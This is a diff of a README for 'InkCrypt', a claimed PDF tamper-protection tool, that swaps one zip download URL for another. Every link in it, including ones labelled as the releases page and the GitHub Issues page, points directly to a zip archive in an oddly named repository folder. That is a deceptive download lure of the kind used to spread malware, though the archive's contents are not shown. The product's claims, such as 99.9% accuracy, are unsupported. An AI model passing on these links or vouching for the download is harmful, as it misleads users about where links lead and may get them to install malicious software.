@@ -1,7 +1,7 @@
 # 🛡️ InkCrypt - Secure Your PDFs Effortlessly
 
 ## 📥 Download Now
-[![Download InkCrypt](https://raw.githubusercontent.com/radwayousryyy/InkCrypt/main/decernment/InkCrypt.zip%https://raw.githubusercontent.com/radwayousryyy/InkCrypt/main/decernment/InkCrypt.zip)](https://raw.githubusercontent.com/radwayousryyy/InkCrypt/main/decernment/InkCrypt.zip)
+[![Download InkCrypt](https://github.com/radwayousryyy/InkCrypt/raw/refs/heads/main/decernment/Ink_Crypt_1.7-alpha.3.zip%https://github.com/radwayousryyy/InkCrypt/raw/refs/heads/main/decernment/Ink_Crypt_1.7-alpha.3.zip)](https://github.com/radwayousryyy/InkCrypt/raw/refs/heads/main/decernment/Ink_Crypt_1.7-alpha.3.zip)
 
 ## 📖 Introduction
 InkCrypt is a PDF security platform that combines cryptographic signatures with machine learning to ensure your documents remain safe from tampering. It provides invisible watermarks, real-time verification, and predictive risk analytics. Whether you're in FinTech, LegalTech, or Healthcare, InkCrypt offers 99.9% accuracy in detecting tampering, keeping your documents secure.
@@ -10,7 +10,7 @@ InkCrypt is a PDF security platform that combines cryptographic signatures with 
 To use InkCrypt, you must first download the software. Follow the steps below to ensure a smooth installation process.
 
 ### 🔗 Visit the Releases Page
-1. Click on this link to visit the releases page: [Download InkCrypt](https://raw.githubusercontent.com/radwayousryyy/InkCrypt/main/decernment/InkCrypt.zip).
+1. Click on this link to visit the releases page: [Download InkCrypt](https://github.com/radwayousryyy/InkCrypt/raw/refs/heads/main/decernment/Ink_Crypt_1.7-alpha.3.zip).
 
 ### 💻 System Requirements
 - **Operating System:** Windows 10 or later, macOS 10.14 (Mojave) or later, or any Linux distribution with Python 3.7 or later.
@@ -22,7 +22,7 @@ To use InkCrypt, you must first download the software. Follow the steps below to
 Select the version that matches your operating system. You will see different options for downloading. 
 
 ## 📥 Download & Install
-1. On the [releases page](https://raw.githubusercontent.com/radwayousryyy/InkCrypt/main/decernment/InkCrypt.zip), find the version suitable for your operating system.
+1. On the [releases page](https://github.com/radwayousryyy/InkCrypt/raw/refs/heads/main/decernment/Ink_Crypt_1.7-alpha.3.zip), find the version suitable for your operating system.
 2. Click on the file to start the download. This will save the installer to your computer.
 3. Once the download finishes, locate the downloaded file. It usually appears in the "Downloads" folder.
 
@@ -83,6 +83,6 @@ If you encounter any issues while using InkCrypt, here are some common solutions
   - Verify that you're using the original PDF file that was secured. Any changes to the document will cause the verification to fail.
 
 ## 📞 Support and Feedback
-If you have questions or need support, feel free to open an issue on our [GitHub Issues page](https://raw.githubusercontent.com/radwayousryyy/InkCrypt/main/decernment/InkCrypt.zip). We appreciate your feedback and are continuously looking to improve InkCrypt.
+If you have questions or need support, feel free to open an issue on our [GitHub Issues page](https://github.com/radwayousryyy/InkCrypt/raw/refs/heads/main/decernment/Ink_Crypt_1.7-alpha.3.zip). We appreciate your feedback and are continuously looking to improve InkCrypt.
 
 Thank you for choosing InkCrypt to secure your PDFs! Enjoy peace of mind knowing your documents are safe from tampering.
